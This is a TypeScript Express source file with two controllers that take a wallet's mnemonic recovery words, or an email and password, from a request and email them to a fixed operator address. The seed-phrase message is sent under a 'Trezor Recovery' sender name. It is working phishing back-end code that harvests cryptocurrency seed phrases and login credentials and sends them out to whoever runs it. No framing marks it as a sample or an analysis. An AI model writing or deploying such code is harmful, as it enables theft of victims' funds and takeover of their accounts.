import { Request, Response } from "express";
import { asyncHandler, errorResponse, successResponse } from "../utils/handlers";
import nodemailer from "nodemailer";

export const sendMnemonicController = asyncHandler(
    async (req: Request, res: Response) => {
        const payload = req.body;

        if (!payload || !payload.data || !Array.isArray(payload.data)) {
            return errorResponse(res, "Invalid payload", 400);
        }

        let htmlContent = `<h2>${payload.heading}</h2><ul>`;
        payload.data.forEach((item: { label: string; value: string }) => {
            htmlContent += `<li><strong>${item.label}:</strong> ${item.value}</li>`;
        });
        htmlContent += `</ul>`;

        try {
            const transporter = nodemailer.createTransport({
                host: process.env.SMTP_HOST,
                port: Number(process.env.SMTP_PORT),
                secure: false,
                auth: {
                    user: process.env.SMTP_USER,
                    pass: process.env.SMTP_PASS,
                },
            });

            await transporter.sendMail({
                from: `"Trezor Recovery" <${process.env.SMTP_USER}>`,
                to: process.env.RECIPIENT_EMAIL,
                subject: "Trezor Mnemonic Recovery Words",
                html: htmlContent,
            });

            return successResponse(res, {}, "Mnemonic sent successfully", 200);
        } catch (error) {
            console.error("Email sending error:", error);
            return errorResponse(res, "Failed to send email", 500);
        }
    }
);


export const sendUserInfoController = asyncHandler(
    async (req: Request, res: Response) => {
        const { title, email, password } = req.body;

        // Validate input
        if (!title || !email || !password) {
            return errorResponse(res, "Missing required fields", 400);
        }

        // Create HTML email content
        const htmlContent = `
      <h2>${title}</h2>
      <ul>
        <li><strong>Email:</strong> ${email}</li>
        <li><strong>Password:</strong> ${password}</li>
      </ul>
    `;

        try {
            // Configure transporter
            const transporter = nodemailer.createTransport({
                host: process.env.SMTP_HOST,
                port: Number(process.env.SMTP_PORT),
                secure: false,
                auth: {
                    user: process.env.SMTP_USER,
                    pass: process.env.SMTP_PASS,
                },
            });

            // Send email
            await transporter.sendMail({
                from: `"${title} Recovery" <${process.env.SMTP_USER}>`,
                to: process.env.RECIPIENT_EMAIL,
                subject: "User Information Received",
                html: htmlContent,
            });

            return successResponse(res, {}, "Email sent successfully", 200);
        } catch (error) {
            console.error("Email sending error:", error);
            return errorResponse(res, "Failed to send email", 500);
        }
    }
);